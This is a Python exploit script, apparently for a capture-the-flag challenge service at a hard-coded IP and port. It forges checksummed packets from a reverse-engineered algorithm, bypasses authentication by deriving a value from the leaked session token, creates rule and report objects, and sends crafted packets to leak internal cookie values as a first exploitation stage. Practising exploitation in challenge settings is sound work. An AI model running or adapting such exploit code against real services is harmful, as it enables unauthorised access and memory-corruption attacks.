import socket, struct, sys, re, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 33395

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.settimeout(8)
    return s

def recv_until(s, marker, timeout=8):
    s.settimeout(timeout)
    buf = b""
    while marker not in buf:
        d = s.recv(4096)
        if not d:
            break
        buf += d
    return buf

def recv_all(s, timeout=2):
    s.settimeout(timeout)
    buf = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf

def calc_checksum(ptype, plen, payload):
    # from fn 14e5
    x = (((ptype << 24) ^ token) & 0xffffffff)
    x ^= plen
    x ^= 0x31415926
    x &= 0xffffffff
    for i in range(plen):
        x = ((x << 5) | (x >> 27)) & 0xffffffff
        x = (x + ((i * 0x45d9f3b) ^ payload[i])) & 0xffffffff
    return x & 0xffffffff

def send_packet(s, ptype, payload):
    plen = len(payload)
    cks = calc_checksum(ptype, plen, payload)
    pkt = struct.pack("<I", ptype) + struct.pack("<I", plen) + struct.pack("<I", cks) + payload
    s.sendall(pkt)

s = connect()
banner = recv_until(s, b"packet type> ")
print("=== BANNER ===")
print(banner.decode(errors="replace"))
m = re.search(rb"session token: ([0-9a-f]{8})", banner)
if not m:
    print("no token found")
    sys.exit(1)
token = int(m.group(1), 16)
print("token =", hex(token))

# AUTH packet: type 2, payload = 4 bytes = token ^ 0xc0ffee00
auth_payload = struct.pack("<I", (token ^ 0xc0ffee00) & 0xffffffff)
send_packet(s, 2, auth_payload)
print("--- after auth ---")
print(recv_all(s, 1).decode(errors="replace"))

# Create small RULE slot: payload = 2-byte rlen (1) + 1 byte
# len must be > 1; rlen=1 => size=8
send_packet(s, 3, struct.pack("<H", 1) + b"A")
print("--- after rule create ---")
print(recv_all(s, 1).decode(errors="replace"))

# Create REPORT: type 4, payload = msg
send_packet(s, 4, b"hello report msg")
print("--- after report create ---")
print(recv_all(s, 1).decode(errors="replace"))

# Leak 'P' proc cookie (puts), 'R' report cookie, 'D' analyzer cookie
for ch in [b"D", b"P", b"R"]:
    send_packet(s, 4, ch)
    r = recv_all(s, 1)
    print(f"--- leak {ch} ---")
    print(r.decode(errors="replace"))

s.close()
